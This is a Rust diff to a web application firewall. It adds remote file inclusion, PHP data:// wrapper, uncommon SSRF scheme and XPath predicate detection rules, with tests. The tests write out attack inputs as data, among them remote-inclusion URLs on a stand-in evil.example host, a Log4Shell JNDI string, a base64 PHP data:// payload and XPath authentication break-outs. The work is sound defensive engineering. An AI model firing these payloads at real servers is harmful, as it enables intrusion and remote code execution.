@@ -36,7 +36,7 @@
 use axum::http::request::Parts;
 use regex::RegexSet;
 
-/// Maximum number of percent-decode passes [`normalize`] performs before giving up.
+/// Maximum number of percent-decode passes the WAF's internal `normalize` performs before giving up.
 /// One pass peels a single encoding layer; reaching this cap means the input was
 /// multiply encoded (or maliciously deep) and is treated as evasive regardless.
 pub const MAX_DECODE_PASSES: usize = 4;
@@ -110,11 +110,20 @@ pub enum WafCategory {
 	/// malicious expression is a value in the request, so detection is IP-free and ports over Tor
 	/// unchanged.
 	XPathInjection,
+	/// Remote file inclusion: input that makes the server fetch **and execute** a script from an
+	/// attacker-controlled remote URL (`?template=https://evil.example/shell.txt`) — the OWASP-CRS
+	/// 931xxx class. It is the peer of, and distinct from, its two neighbours:
+	/// [`PathTraversal`](Self::PathTraversal) is *local* inclusion (the file is already on the
+	/// host), and [`Ssrf`](Self::Ssrf) makes the server *fetch* an internal URL but not run it.
+	/// RFI is the one that ends in remote code execution, which is why CRS scores it as its own
+	/// critical class. The remote URL is a value in the request, so detection needs no client IP
+	/// and ports over Tor unchanged.
+	Rfi,
 }
 
 impl WafCategory {
 	/// Every category, in [`index`](Self::index) order — for iterating per-category metrics.
-	pub const ALL: [WafCategory; 12] = [Self::Sqli, Self::Xss, Self::PathTraversal, Self::CommandInjection, Self::Ssrf, Self::CodeInjection, Self::ProtocolAnomaly, Self::NoSqlInjection, Self::LdapInjection, Self::Xxe, Self::ScannerDetection, Self::XPathInjection];
+	pub const ALL: [WafCategory; 13] = [Self::Sqli, Self::Xss, Self::PathTraversal, Self::CommandInjection, Self::Ssrf, Self::CodeInjection, Self::ProtocolAnomaly, Self::NoSqlInjection, Self::LdapInjection, Self::Xxe, Self::ScannerDetection, Self::XPathInjection, Self::Rfi];
 
 	/// A stable, lowercase name for logs and security events.
 	#[must_use]
@@ -132,6 +141,7 @@ impl WafCategory {
 			Self::ProtocolAnomaly => "protocol_anomaly",
 			Self::ScannerDetection => "scanner_detection",
 			Self::XPathInjection => "xpath_injection",
+			Self::Rfi => "rfi",
 		}
 	}
 
@@ -144,7 +154,7 @@ impl WafCategory {
 	#[must_use]
 	pub const fn weight(self) -> u32 {
 		match self {
-			Self::Sqli | Self::CommandInjection | Self::Ssrf | Self::PathTraversal | Self::CodeInjection | Self::NoSqlInjection | Self::LdapInjection | Self::Xxe | Self::ScannerDetection | Self::XPathInjection => 5,
+			Self::Sqli | Self::CommandInjection | Self::Ssrf | Self::PathTraversal | Self::CodeInjection | Self::NoSqlInjection | Self::LdapInjection | Self::Xxe | Self::ScannerDetection | Self::XPathInjection | Self::Rfi => 5,
 			Self::Xss => 4,
 			Self::ProtocolAnomaly => 3,
 		}
@@ -167,6 +177,7 @@ impl WafCategory {
 			Self::Xxe => 9,
 			Self::ScannerDetection => 10,
 			Self::XPathInjection => 11,
+			Self::Rfi => 12,
 		}
 	}
 }
@@ -1262,7 +1273,12 @@ pub fn starter_rules() -> Vec<Rule> {
 			category: WafCategory::PathTraversal,
 			pattern: r"(?i)(/\.(claude|cursor|continue|aider|roo|zed|cline|kiro|windsurf|rovodev|codex|opencode|a0proj|plandex|fabric|n8n|junie|gemini|openclaw|clawdbot|trustclaw|zeroclaw|warp)/|/\.(qwen_code|crush)\b)",
 		},
-		Rule { id: "traversal_php_wrapper", category: WafCategory::PathTraversal, pattern: r"(?i)\b(php|phar|expect|zip|glob)://" },
+		// PHP stream wrappers. `data` is the one that was missing and the one that matters most: with
+		// `allow_url_include` on, `data://text/plain;base64,PD9waHA…` hands the interpreter a whole
+		// script inline — inclusion with no remote host to reach, so neither the `Rfi` rules (which
+		// require a remote URL) nor a network egress control sees it. Distinct from the `data:` URI the
+		// XSS rules match: that one has no `//` and targets the browser, this one targets the server.
+		Rule { id: "traversal_php_wrapper", category: WafCategory::PathTraversal, pattern: r"(?i)\b(php|phar|expect|zip|glob|data)://" },
 		// Overlong / invalid UTF-8 traversal (OWASP-CRS path-traversal evasion): the invalid multi-byte
 		// encodings of `.` and `/`/`\` — `%c0%ae` / `%e0%80%ae` (overlong `.`), `%c0%af` / `%e0%80%af`
 		// (overlong `/`), `%c1%9c` (overlong `\`). A conformant UTF-8 decoder rejects these, but a
@@ -1370,6 +1386,17 @@ pub fn starter_rules() -> Vec<Rule> {
 		// --- Server-side code / expression injection (value inspection; no client IP needed) ---
 		Rule { id: "code_log4shell_jndi", category: WafCategory::CodeInjection, pattern: r"(?i)\$\{jndi:" },
 		Rule { id: "code_log4j_nested_lookup", category: WafCategory::CodeInjection, pattern: r"(?i)\$\{[^}]{0,30}\$\{" },
+		// The remaining fetchable URL schemes an SSRF sink accepts, past the `gopher`/`dict`/`file`
+		// trio: `ldap(s)` (the JNDI/SSRF workhorse), `tftp`, `sftp`, and Java's `netdoc`.
+		//
+		// **It sits here, deliberately, and not with its `ssrf_*` siblings above.** Rule order *is*
+		// first-match order, and `${jndi:ldap://evil/a}` contains `ldap://` — so an `ldap` alternative
+		// placed up in the SSRF block would match Log4Shell payloads *before* `code_log4shell_jndi`
+		// ever ran, silently re-labelling the single most recognisable RCE in the set as an SSRF.
+		// Placing it after the JNDI rules is what keeps that attribution correct (regex-crate patterns
+		// have no lookbehind, so ordering, not the pattern, is the tool here). `ssrf_scheme_ordering_
+		// keeps_log4shell_attribution` pins it.
+		Rule { id: "ssrf_uncommon_scheme", category: WafCategory::Ssrf, pattern: r"(?i)\b(ldaps?|tftp|sftp|netdoc)://" },
 		Rule { id: "code_php_object_inject", category: WafCategory::CodeInjection, pattern: r#"(?i)\b[oc]:\d+:"[a-z0-9_\\]+":\d+:\{"# },
 		Rule { id: "code_ssti_arithmetic", category: WafCategory::CodeInjection, pattern: r"\$\{\s*\d+\s*[*]\s*\d+\s*\}" },
 		Rule { id: "code_ssti_template", category: WafCategory::CodeInjection, pattern: r"\{\{\s*\d+\s*[*]\s*\d+\s*\}\}" },
@@ -1540,6 +1567,48 @@ pub fn starter_rules() -> Vec<Rule> {
 			category: WafCategory::XPathInjection,
 			pattern: r"(?i)(\bdeclare\s+(namespace|default\s+(element|function))\b|\bfor\s+\$\w+\s+in\b[\s\S]{0,80}\breturn\b|\bcount\s*\(\s*/)",
 		},
+		// An XPath *node test or node function opening a predicate* — `[text()='x']`, `[position()=2]`,
+		// `[substring(name(),1,4)='adm']`. The predicate-opening `[` is the false-positive anchor the
+		// bare function names cannot carry on their own: jQuery's `.text()`, a generic `substring(` in a
+		// posted code sample, or a `contains(` in prose all lack it, while an XPath predicate cannot be
+		// written without it. `not(` is allowed to sit between the two (`[not(contains(@r,'admin'))]`),
+		// which is the negation form of the same shape. `concat(`/`translate(`/`node(` are deliberately
+		// left out — the first two are equally SQL/JS idioms, and `node()` only appears on an axis step
+		// (`descendant::node()`), which `xpathi_axis` already holds.
+		Rule {
+			id: "xpathi_predicate_function",
+			category: WafCategory::XPathInjection,
+			pattern: r"(?i)\[\s*(not\s*\(\s*)?(local-name|namespace-uri|normalize-space|string-length|substring-before|substring-after|substring|starts-with|contains|position|last|text|name|count)\s*\(",
+		},
+		// The abbreviated attribute axis inside a predicate, compared against a literal — `[@name='admin']`,
+		// `[@id!=1]`, `[@role=$r]`. This is the shape of the classic XPath authentication break-out
+		// (`//user[@name='x' or '1'='1']`). Requiring both the comparison operator *and* a literal head
+		// (quote / digit / `$var`) after the attribute name is what holds the false positives down: an
+		// `@`-mention in markup (`[@alice]`) has no comparison, and a bare `[@key=value]`-style config or
+		// tag syntax has no quoted/numeric right-hand side, so both stay clean.
+		Rule { id: "xpathi_attribute_predicate", category: WafCategory::XPathInjection, pattern: r#"(?i)\[\s*@[\w:.-]+\s*(!=|<=|>=|=|<|>)\s*('|"|\d|\$)"# },
+		// --- Remote file inclusion (OWASP-CRS 931xxx port; value inspection, no client IP) ---
+		// An *inclusion-flavored parameter* set to a remote URL — `?template=https://evil.example/s.txt`,
+		// `?include=ftp://…`. The two halves are each individually benign and only the pair is a signal,
+		// which is the whole design: a remote URL in a request is ordinary (OAuth `redirect_uri`, a
+		// callback, an image proxy), and a parameter named `template` is ordinary — but a parameter whose
+		// name says "the server will load this as code" carrying an off-host URL is the RFI shape.
+		// The name list is deliberately confined to the load-this-as-code family and **excludes** the
+		// params that legitimately carry URLs (`url`, `link`, `redirect`, `redirect_uri`, `next`,
+		// `return`/`return_to`, `callback`, `src`, `image`, `doc`, `view`, `content`) — CRS's own 931110
+		// name list is far broader and is a known false-positive source at PL1.
+		Rule {
+			id: "rfi_include_param_remote_url",
+			category: WafCategory::Rfi,
+			pattern: r"(?i)\b(include(_once)?|require(_once)?|template|tpl|page|pg|file|filename|filepath|conf|config|mod|module|load|layout|theme|skin|root|folder)\s*=\s*(https?|ftps?)://",
+		},
+		// A remote URL whose value *ends* in `?` (CRS rule 931120). This is the RFI payload's signature
+		// truncation trick rather than a URL anyone types: the vulnerable sink does
+		// `include($_GET['p'] . '/footer.php')`, so the attacker appends `?` to push the server's
+		// concatenated suffix into the query string of *their* URL, where it is ignored. A legitimate URL
+		// parameter does not end at a bare `?` — the character has no meaning there — so requiring the
+		// value boundary (`&` or end of field) right after it is what keeps this clean.
+		Rule { id: "rfi_url_trailing_question", category: WafCategory::Rfi, pattern: r"(?i)(https?|ftps?)://[^\s&\x22'<>]+\?(&|$)" },
 		// --- Protocol anomalies ---
 		Rule { id: "anomaly_null_byte", category: WafCategory::ProtocolAnomaly, pattern: r"(\x00|%00)" },
 		Rule { id: "anomaly_crlf", category: WafCategory::ProtocolAnomaly, pattern: r"(\r\n|%0d%0a|%0a|%0d)" },
@@ -1586,6 +1655,24 @@ mod tests {
 	fn starter_rules_compile() {
 		let waf = Waf::starter();
 		assert_eq!(waf.rule_count(), starter_rules().len());
+	}
+
+	#[test]
+	fn starter_rule_ids_are_unique() {
+		// The rule id is an operator-facing key, not a label: `disable_rule(id)` switches off *every*
+		// rule whose id matches, and `is_rule_enabled` reports on the first hit. So a duplicated id
+		// silently breaks the per-rule disabling this crate advertises — an operator turning off one
+		// noisy rule would turn off an unrelated one with it, and the WAF would report the same id for
+		// two different signatures on the event stream. Nothing else in the table enforces this: the ids
+		// are hand-written string literals across ~100 rules, and a copy-pasted rule is exactly how a
+		// duplicate arrives. The table is only ever appended to, so this is cheap insurance on the
+		// invariant everything else assumes.
+		let rules = starter_rules();
+		let mut seen = std::collections::HashSet::new();
+		for rule in &rules {
+			assert!(seen.insert(rule.id), "duplicate starter rule id: {}", rule.id);
+		}
+		assert_eq!(seen.len(), rules.len());
 	}
 
 	#[test]
@@ -3269,6 +3356,44 @@ mod tests {
 	}
 
 	#[test]
+	fn xpath_predicate_function_is_blocked() {
+		// A node test / node function opening a predicate — the forms the axis and FLWOR rules skip.
+		let waf = Waf::starter();
+		for value in [
+			"q=//user[text()='admin']",                      // text() node test
+			"q=/users/user[position()=1]/password",          // position() predicate
+			"q=//user[name()='password']",                   // name() node test
+			"q=//user[substring(name(),1,4)='root']",        // substring( — the deferral's FP worry, anchored
+			"q=//user[starts-with(@name,'adm')]",            // starts-with(
+			"q=//user[not(contains(@role,'guest'))]/secret", // the not(-wrapped negation form
+			"q=//a[last()]",                                 // last()
+			"q=//node[string-length(text())>0]",             // string-length(
+		] {
+			let m = waf.inspect_str(value, "query").unwrap_or_else(|| panic!("{value} should be blocked"));
+			assert_eq!(m.category, WafCategory::XPathInjection, "{value}");
+			assert_eq!(m.rule_id, "xpathi_predicate_function", "{value}");
+		}
+	}
+
+	#[test]
+	fn xpath_attribute_predicate_is_blocked() {
+		// The abbreviated attribute axis compared against a literal — the classic auth break-out shape.
+		let waf = Waf::starter();
+		for value in [
+			"q=//user[@name='admin']/password",   // quoted string literal
+			"q=//user[@id=1]",                    // numeric literal
+			"q=//user[@role!=\"guest\"]",         // negated comparison
+			"q=//user[@level>=3]",                // relational comparison
+			"q=//user[@name=$injected]",          // variable reference
+			"q=//account[ @user.name = 'root' ]", // whitespace-padded, dotted attribute name
+		] {
+			let m = waf.inspect_str(value, "query").unwrap_or_else(|| panic!("{value} should be blocked"));
+			assert_eq!(m.category, WafCategory::XPathInjection, "{value}");
+			assert_eq!(m.rule_id, "xpathi_attribute_predicate", "{value}");
+		}
+	}
+
+	#[test]
 	fn xpath_injection_keeps_false_positives_low() {
 		// Generic `::` scope operators from posted Rust/PHP/C++ code (not XPath axes), an "ancestor"
 		// word with no axis `::`, a `for`/`return` in prose without the FLWOR shape, and a `count(` that
@@ -3287,10 +3412,153 @@ mod tests {
 	}
 
 	#[test]
+	fn xpath_wildcard_node_set_attributes_to_the_sql_comment_rule_first() {
+		// Found while adding the predicate rules, and worth pinning rather than hiding: the XPath
+		// wildcard step `//*` *contains* `/*`, the SQL comment opener, so a `//*[…]` payload trips a
+		// Sqli rule before the XPath rules are ever reached (first-match order runs Sqli first).
+		//
+		// It is not a miss — the request is blocked either way, which is what protects the app — but
+		// the *attribution* an operator sees on their event stream says `sqli`, not `xpath_injection`.
+		// Left as-is deliberately: re-ordering the rule table to fix a label would change which rule
+		// reports every overlapping payload in the whole set, and blocking is the load-bearing part.
+		// Both facts are asserted so neither can drift silently.
+		let waf = Waf::starter();
+		let Verdict::Block(m) = waf.inspect(&parts("GET", "/x?q=//*[name()='password']")) else {
+			panic!("a wildcard-step XPath payload must still block");
+		};
+		assert_eq!(m.category, WafCategory::Sqli, "the `/*` comment token wins first-match");
+
+		// Scoring inspects every rule, so the XPath signal is still visible there — an operator who
+		// scores rather than first-matches does see the XPath attribution.
+		let all = waf.inspect_all(&parts("GET", "/x?q=//*[name()='password']"));
+		assert!(all.iter().any(|m| m.rule_id == "xpathi_predicate_function"), "got: {all:?}");
+	}
+
+	#[test]
+	fn xpath_predicate_rules_keep_false_positives_low() {
+		// The exact collisions that deferred this rule pair: an XPath node function's name is only a
+		// signal *inside a predicate*, and an `@`-token is only a signal when compared to a literal.
+		let waf = Waf::starter();
+		for uri in [
+			"/js?snip=$(el).text()",            // jQuery .text() — a function call, no predicate `[`
+			"/js?snip=s.substring(0,4)",        // generic substring( — the named FP worry
+			"/docs?q=how+contains()+works",     // prose mentioning a function name
+			"/api/items[0]",                    // an index predicate with no node test
+			"/data?rows[1]=x&rows[2]=y",        // PHP/Rails-style bracket params
+			"/feed?msg=hi+[@alice]+welcome",    // an @-mention, no comparison operator
+			"/cfg?opt=[@section]",              // a bare bracketed @-token
+			"/post?body=email+me+[@me=you]",    // `[@k=v]` with no quoted/numeric literal head
+			"/search?q=last+call+for+position", // the function words as prose
+		] {
+			assert_eq!(waf.inspect(&parts("GET", uri)), Verdict::Allow, "{uri} should not false-positive");
+		}
+
+		// The known over-match, asserted rather than left to be discovered: source code that indexes with
+		// a call (`arr[name(x)]`) is indistinguishable from an XPath predicate by shape alone, so it
+		// trips. Accepted because it is a *code* form, not something that appears in ordinary request
+		// values — but pinned here so a future reader sees it was a decision, and a change of heart
+		// shows up as this test failing rather than as a silent behaviour change.
+		let Verdict::Block(m) = waf.inspect(&parts("GET", "/code?c=arr[name(x)]")) else {
+			panic!("the documented over-match should still block");
+		};
+		assert_eq!(m.rule_id, "xpathi_predicate_function");
+	}
+
+	#[test]
+	fn rfi_include_param_with_remote_url_is_blocked() {
+		// The load-this-as-code parameter families, across the schemes CRS lists.
+		let waf = Waf::starter();
+		for value in ["template=https://evil.example/shell.txt", "include=http://evil.example/c99.php", "require_once=https://evil.example/x", "page=ftp://evil.example/shell", "file=https://evil.example/payload", "module=ftps://evil.example/m", "conf=http://evil.example/cfg"] {
+			let m = waf.inspect_str(value, "query").unwrap_or_else(|| panic!("{value} should be blocked"));
+			assert_eq!(m.category, WafCategory::Rfi, "{value}");
+			assert_eq!(m.rule_id, "rfi_include_param_remote_url", "{value}");
+		}
+	}
+
+	#[test]
+	fn rfi_trailing_question_truncation_is_blocked() {
+		// The `?`-truncation payload (CRS 931120), both at the end of the field and mid-query.
+		let waf = Waf::starter();
+		let m = waf.inspect_str("p=https://evil.example/shell.txt?", "query").unwrap();
+		assert_eq!(m.category, WafCategory::Rfi);
+		assert_eq!(m.rule_id, "rfi_url_trailing_question");
+		let m = waf.inspect_str("p=http://evil.example/shell?&next=2", "query").unwrap();
+		assert_eq!(m.rule_id, "rfi_url_trailing_question");
+	}
+
+	#[test]
+	fn rfi_keeps_false_positives_low() {
+		// The reason the CRS 931110 name list was not ported wholesale: a remote URL in a request is
+		// ordinary. Only the *pair* (inclusion-flavored name + remote URL) is a signal, and a URL that
+		// merely contains a query is not the truncation payload.
+		let waf = Waf::starter();
+		for uri in [
+			"/oauth?redirect_uri=https://app.example/callback", // the canonical URL-carrying param
+			"/go?next=https://app.example/dashboard",           // post-login return
+			"/share?url=https://news.example/story",            // a link-sharing param
+			"/proxy?image=https://cdn.example/a.png",           // an image proxy
+			"/embed?src=https://video.example/v/1",             // an embed source
+			"/r?callback=https://app.example/done",             // a callback
+			"/render?template=invoice_v2",                      // an inclusion param with a *local* value
+			"/view?page=2",                                     // an inclusion param, no URL at all
+			"/fetch?u=https://api.example/v1?limit=10",         // a URL with a query — `?` is not trailing
+		] {
+			assert_eq!(waf.inspect(&parts("GET", uri)), Verdict::Allow, "{uri} should not false-positive");
+		}
+	}
+
+	#[test]
+	fn uncommon_ssrf_schemes_are_blocked() {
+		let waf = Waf::starter();
+		// Payloads deliberately carry no `/etc/passwd`-style tail: that would trip
+		// `traversal_sensitive_file` first and the test would pass without proving the scheme rule
+		// fires at all.
+		for value in ["u=ldap://10.0.0.5/o=corp", "u=ldaps://internal.local/x", "u=tftp://10.0.0.5/boot", "u=sftp://10.0.0.5/backup.tar", "u=netdoc:///home/app/secret"] {
+			let m = waf.inspect_str(value, "query").unwrap_or_else(|| panic!("{value} should be blocked"));
+			assert_eq!(m.category, WafCategory::Ssrf, "{value}");
+		}
+	}
+
+	#[test]
+	fn ssrf_scheme_ordering_keeps_log4shell_attribution() {
+		// The reason `ssrf_uncommon_scheme` is placed after the JNDI rules rather than with its
+		// siblings: a Log4Shell payload *contains* `ldap://`, and rule order is first-match order.
+		// If this ever reports Ssrf, the rule moved and the most recognisable RCE in the set is being
+		// mis-labelled.
+		let waf = Waf::starter();
+		let m = waf.inspect_str("x=${jndi:ldap://evil.example/a}", "header:x-api-version").unwrap();
+		assert_eq!(m.rule_id, "code_log4shell_jndi");
+		assert_eq!(m.category, WafCategory::CodeInjection);
+	}
+
+	#[test]
+	fn php_data_wrapper_is_blocked() {
+		// Inline code inclusion: no remote host, so the Rfi rules cannot see it.
+		let waf = Waf::starter();
+		let m = waf.inspect_str("page=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw==", "query").unwrap();
+		assert_eq!(m.category, WafCategory::PathTraversal);
+		assert_eq!(m.rule_id, "traversal_php_wrapper");
+		// The browser-facing `data:` URI is a different rule and must stay that way.
+		assert_eq!(waf.inspect_str("q=data:text/html,<script>alert(1)</script>", "query").unwrap().category, WafCategory::Xss);
+	}
+
+	#[test]
+	fn rfi_category_metadata_is_stable() {
+		assert_eq!(WafCategory::Rfi.name(), "rfi");
+		assert_eq!(WafCategory::Rfi.weight(), WafCategory::PathTraversal.weight());
+		assert_eq!(WafCategory::Rfi.index(), 12);
+		assert_eq!(WafCategory::ALL.len(), 13);
+		// Appending the category kept the index a bijection over the whole set.
+		for cat in WafCategory::ALL {
+			assert_eq!(WafCategory::ALL[cat.index()], cat);
+		}
+	}
+
+	#[test]
 	fn xpath_category_metadata_is_stable() {
 		assert_eq!(WafCategory::XPathInjection.name(), "xpath_injection");
 		assert_eq!(WafCategory::XPathInjection.weight(), WafCategory::Sqli.weight());
-		assert_eq!(WafCategory::ALL.len(), 12);
+		assert_eq!(WafCategory::ALL.len(), 13);
 		// Appending the category kept the index a bijection.
 		for cat in WafCategory::ALL {
 			assert_eq!(WafCategory::ALL[cat.index()], cat);
@@ -3403,8 +3671,8 @@ mod tests {
 		assert_eq!(WafCategory::ScannerDetection.name(), "scanner_detection");
 		assert_eq!(WafCategory::ScannerDetection.weight(), WafCategory::Sqli.weight());
 		assert_eq!(WafCategory::ALL[WafCategory::ScannerDetection.index()], WafCategory::ScannerDetection);
-		// The index is still a bijection over every category (now twelve, after XPathInjection).
-		assert_eq!(WafCategory::ALL.len(), 12);
+		// The index is still a bijection over every category (now thirteen, after Rfi).
+		assert_eq!(WafCategory::ALL.len(), 13);
 		for cat in WafCategory::ALL {
 			assert_eq!(WafCategory::ALL[cat.index()], cat);
 		}
